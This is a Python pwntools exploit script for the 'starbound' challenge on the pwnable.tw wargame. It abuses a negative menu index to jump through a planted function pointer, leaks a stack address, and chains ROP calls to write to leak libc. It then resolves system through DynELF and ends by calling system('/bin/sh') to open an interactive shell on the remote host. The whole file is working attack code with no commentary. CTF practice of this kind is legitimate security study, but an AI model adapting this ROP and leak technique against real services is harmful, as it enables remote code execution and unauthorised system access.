#!/usr/bin/env python

from pwn import *

context.update(log_level='debug', arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])

#p = process('./starbound')
p = remote('chall.pwnable.tw', 10202)

def dbg(cmd=''):
    gdb.attach(p, cmd)
    if cmd == '':
        raw_input()

def set_name(name):
    p.sendlineafter('> ', '6\x00')
    p.sendlineafter('> ', '2\x00')
    p.sendlineafter(': ', name + '\x00')
    p.sendlineafter('> ', '1\x00')

opcode_add_esp_0x1c_ret = 0x08048e48

elf = ELF('./starbound')

set_name(p32(elf.plt['puts']))
p.recvuntil('> ')
#dbg('break *0x804A63D\nignore 1 3\ncontinue')
#dbg('break system\ncontinue')
p.send('-33K')
p.recvuntil('-33K')

leak_addr = u32(p.recv(4))
esp_value = leak_addr - 0xc0
log.info('leak_addr = ' + hex(leak_addr))
log.info('esp_value = ' + hex(esp_value))

def run_rop(rop):
    set_name(p32(opcode_add_esp_0x1c_ret))
    pay = '-33'
    pay = pay.ljust(8, 'A')
    pay += rop
    p.sendlineafter('> ', pay + '\x00')
    global esp_value
    esp_value += 0x1c + 0x4
    log.info('esp_value = ' + hex(esp_value))

def leak(addr):
    log.info('dynelf leak addr = ' + hex(addr))
    rop = p32(elf.plt['write']) + p32(0x0804A617) + p32(1) + p32(addr) + p32(0x100)
    run_rop(rop)
    ret = p.recv(0x100)
    log.info('leak >>' + ret)
    return ret

dyn = DynELF(leak, elf=elf, libcdb=False)
system_addr = dyn.lookup('system', 'libc')
log.success('system_addr =' + hex(system_addr))

input_addr = esp_value + 0x10
rop = p32(system_addr) + p32(0x0804A617) + p32(input_addr + 0x8 + 0x4 * 3) + '/bin/sh\x00'
run_rop(rop)
p.send('-33K')

p.interactive()

exit()
